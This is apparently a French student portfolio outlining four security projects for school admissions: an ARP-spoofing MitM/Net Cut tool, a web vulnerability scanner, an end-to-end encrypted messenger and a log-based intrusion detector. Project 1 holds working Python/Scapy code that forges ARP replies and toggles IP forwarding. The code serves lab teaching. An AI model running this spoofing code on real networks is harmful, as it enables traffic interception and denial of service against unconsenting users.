# Portfolio de Projets R&D – Cybersécurité & Sécurité Applicative

Ce document rassemble les spécifications, architectures et implémentations de quatre projets conçus pour valoriser un profil de développeur (**BTS SIO option SLAM**) lors des admissions sur titre (AST) en écoles d'ingénieurs (**INSA**, **Polytech**, **CPE Lyon**) ou en Master Cybersécurité.

---

## 📁 Projet 1 : Network Security Testing Tool (ARP Spoofing, MitM & Net Cut)

### 📌 Présentation
Un script en Python exploitant la bibliothèque Scapy pour simuler les vulnérabilités structurelles du protocole ARP (couche 2 du modèle OSI). L'outil permet de réaliser un empoisonnement de cache ARP (*ARP Cache Poisoning*) afin d'illustrer deux scénarios d'attaque majeurs en laboratoire : le détournement de trafic (*Man-in-the-Middle*) et le déni de service local (*Net Cut*).

### 🛠️ Architecture & Concepts Clés
- **Génération de paquets bas niveau :** Utilisation de Scapy pour forger des trames `Ethernet` et des paquets `ARP` personnalisés.
- **Routage de paquets (IP Forwarding) :** 
  - *Mode MitM :* Activation du transfert de paquets au niveau du noyau pour relayer le trafic de la victime de manière transparente.
  - *Mode Net Cut :* Désactivation du transfert de paquets. L'attaquant intercepte le trafic mais le rejette, simulant un déni de service (DoS).
- **Restauration du réseau :** Envoi de paquets correctifs légitimes lors de l'interruption du script afin de stabiliser les tables ARP des machines cibles.

### 💻 Extrait de Code (Python / Scapy)
```python
import scapy.all as scapy
import time
import os

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac: return
    # op=2 indique une réponse ARP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def toggle_forwarding(enable=True):
    val = "1" if enable else "0"
    os.system(f"echo {val} > /proc/sys/net/ipv4/ip_forward")

# Exemple d'exécution : spoof("192.168.1.50", "192.168.1.1")
```

---

## 📁 Projet 2 : Mini-Scanner de Vulnérabilités Web (DAST)

### 📌 Présentation
Un outil d'audit de sécurité dynamique (Dynamic Application Security Testing - DAST) développé en Python ou en Go. Ce scanner en ligne de commande analyse la surface d'attaque externe d'une application web en testant sa configuration de sécurité et sa résilience face aux failles du Top 10 OWASP.

### 🛠️ Architecture & Concepts Clés
- **Analyse des Headers HTTP :** Vérification systématique de l'implémentation des en-têtes de sécurité essentiels pour atténuer les attaques courantes :
  - `Content-Security-Policy` (Atténuation XSS)
  - `X-Frame-Options` (Protection contre le Clickjacking)
  - `Strict-Transport-Security` (HSTS - Forçage HTTPS)
- **Fuzzing & Injection Basique :** Injection automatisée de charges utiles (*payloads*) non destructives dans les paramètres d'URL ou les formulaires pour détecter les comportements anormaux (injections SQL basiques ou failles XSS reflétées).

---

## 📁 Projet 3 : Messagerie Chiffrée de Bout en Bout (E2EE)

### 📌 Présentation
Une application web de messagerie instantanée tirant parti de **Spring Boot** pour l'architecture serveur et de la cryptographie pure pour garantir la confidentialité des données. Le serveur agit uniquement comme un relais de transport, rendant l'interception de données impossible, même en cas de compromission de la base de données.

### 🛠️ Architecture & Concepts Clés
- **Algorithmes de Chiffrement :**
  - **RSA (Asymétrique) :** Utilisé pour l'authentification des clients et l'échange sécurisé de clés de session.
  - **AES (Symétrique) :** Utilisé pour le chiffrement des messages textuels en raison de ses performances de traitement (fondé sur des transformations et opérations matricielles).
- **Architecture Zero-Knowledge :** Les clés privées de chiffrement restent exclusivement stockées côté client (mémoire volatile du navigateur). Le serveur Spring Boot ne traite et ne stocke que des flux de données chiffrés.

---

## 📁 Projet 4 : Analyseur de Logs & Système de Détection d'Intrusions (SIEM)

### 📌 Présentation
Un script d'automatisation défensif qui surveille et analyse en temps réel les journaux d'accès d'un serveur (Nginx, Apache ou Syslog) afin d'identifier, corréler et bloquer les comportements malveillants ou suspects.

### 🛠️ Architecture & Concepts Clés
- **Log Parsing (Expressions Régulières) :** Utilisation de Regex complexes pour extraire dynamiquement les adresses IP, les codes de statut HTTP, et les ressources demandées à chaque nouvelle entrée de journal.
- **Moteur de Règles et Corrélation :** 
  - Détection de tentatives de force brute (ex. : génération de plus de 30 codes d'erreur `401 Unauthorized` ou `404 Not Found` en moins de 10 secondes depuis une même adresse IP).
- **Remédiation Automatisée :** Déclenchement automatique d'actions défensives (alertes via Webhooks vers Discord/Telegram ou exécution de commandes de filtrage réseau via un pare-feu local).

---

## ⚠️ Clause de Responsabilité & Éthique
*L'ensemble de ces projets est développé exclusivement à des fins éducatives, de recherche et de démonstration de compétences dans un cadre académique. Les tests et simulations d'attaques doivent être réalisés uniquement au sein d'environnements de laboratoire isolés (machines virtuelles, réseaux privés dédiés) avec l'accord explicite des parties prenantes.*